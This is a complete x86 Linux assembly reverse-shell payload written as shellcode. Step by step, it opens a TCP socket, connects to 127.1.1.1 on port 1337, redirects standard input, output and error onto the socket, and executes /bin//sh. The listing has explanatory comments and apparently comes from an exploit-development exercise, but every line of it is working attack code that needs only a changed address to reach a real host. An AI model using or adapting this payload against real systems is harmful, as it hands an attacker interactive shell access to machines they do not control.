global _start

section .text

_start:
  ; socket
  ;; cleanup
  xor ebx, ebx
  ;; arguments
  push ebx          ; #define IP_PROTO 0
  push 0x1          ; #define SOCK_STREAM 1
  push 0x2          ; #define PF_INET 2
  ;; function
  mov ecx, esp      ; pointer to args on the stack into ecx
  push 0x66
  pop eax           ; socketcall 0x66 == 102
  inc ebx           ; #define SYS_SOCKET 1
  ;; call
  int 0x80
  ;; returned data
  xchg esi, eax     ; sockfd eax -> esi

  ; connect ipv4
  ;; v4rhost struct
  inc ebx           ; 0x1 becomes 0x2 (PF_INET)
  push 0x0101017F   ; v4rhost.sin_addr.s_addr = 127.1.1.1
  push word 0x3905  ; v4rhost.sin_port = htons(1337)
  push bx           ; v4rhost.sin_family = 0x2 (AF_INET)
  ;; arguments
  inc ebx           ; 0x2 becomes 0x3 (SYS_CONNECT)
  mov ecx, esp      ; move our struct pointer into ECX
  push 0x10         ; sizeof v4rhost
  push ecx          ; pointer v4rhost
  push esi          ; push sockfd onto the stack
  ;; function
  mov ecx, esp      ; pointer to args on the stack into ecx
  push 0x66         ; socketcall()
  pop eax
  ;; call
  int 0x80
  ;; returned data
  xchg ebx, esi     ; put sockfd into ebx for dup call

  ; dup2
  ;; setup counters
  sub ecx, ecx
  mov cl, 0x2
  ;; loop
duploop:
  mov al, 0x3f      ; SYS_DUP2 syscall
  int 0x80          ; call SYS_DUP2
  dec ecx           ; decrement loop counter
  jns duploop       ; as long as SF is not set, keep looping

  ; execve
  ;; cleanup
  xor edx, edx
  ;; command to run
  push edx          ; NULL string terminator
  push 0x68732f2f   ; hs//
  push 0x6e69622f   ; nib/
  ;; arguments
  mov ecx, edx      ; null
  mov ebx, esp      ; pointer to args into ebx
  mov al, 0x0b      ; execve systemcall
  ;; call
  int 0x80
